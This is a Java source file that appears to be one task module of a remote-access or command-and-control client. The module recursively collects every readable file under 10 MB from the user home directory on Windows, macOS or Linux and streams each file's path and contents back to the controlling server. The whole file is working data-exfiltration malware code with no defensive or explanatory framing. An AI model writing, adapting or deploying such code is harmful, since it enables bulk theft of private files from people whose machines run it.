package Server.Tasks.PullHardDrive;

import Server.ResponseHandler;
import Server.Task;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class PullHardDriveTask extends Task {


  private static final String WINDOWS_BASE_DIR = "C:\\Users\\";
  private static final String LINUX_BASE_DIR = "~/";
  private static final String MAC_BASE_DIR = "/Users/";

  List<File> listOfAllFiles = new ArrayList<>();

  public static PullHardDriveTask buildFromScanner(Scanner scanner) {
    return new PullHardDriveTask();
  }

  private String getOSBaseDir() {
    String os = System.getProperty("os.name").toLowerCase();

    if (isWindows(os)) {
      return WINDOWS_BASE_DIR;
    } else if (isMac(os)) {
      return MAC_BASE_DIR;
    } else {
      return LINUX_BASE_DIR;
    }

  }

  private boolean isWindows(String OS) {
    return (OS.indexOf("win") >= 0);
  }

  private boolean isMac(String OS) {
    return (OS.indexOf("mac") >= 0);
  }

  private boolean isUnix(String OS) {
    return (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0 || OS.indexOf("aix") > 0);
  }

  private void getAllFilesInDirectoryAndSendToServer(String baseDirectory,
      ObjectOutputStream streamToServer) {

    File[] allFiles = new File(baseDirectory).listFiles();

    for (File file : allFiles) {

      if (file.isDirectory()) {
        getAllFilesInDirectoryAndSendToServer(file.getPath(), streamToServer);
      }

      if (file.length() > 10485760) {
        continue;
      }

      try {
        FileAndContent fileToSend = new FileAndContent(file.getPath());

        if (fileToSend.getContent() != null) { // If we can read the file
          streamToServer.writeObject(fileToSend);
          streamToServer.flush();
        }

      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }

  @Override
  public void execute() {
    // No preprocessing needed

  }

  @Override
  public void returnResponse(ObjectOutputStream streamToServer) {
    String baseDir = getOSBaseDir();

    getAllFilesInDirectoryAndSendToServer(baseDir, streamToServer);
  }

  @Override
  public ResponseHandler getResponseHandler() {
    return new PullHardDriveResponseHandler();
  }
}
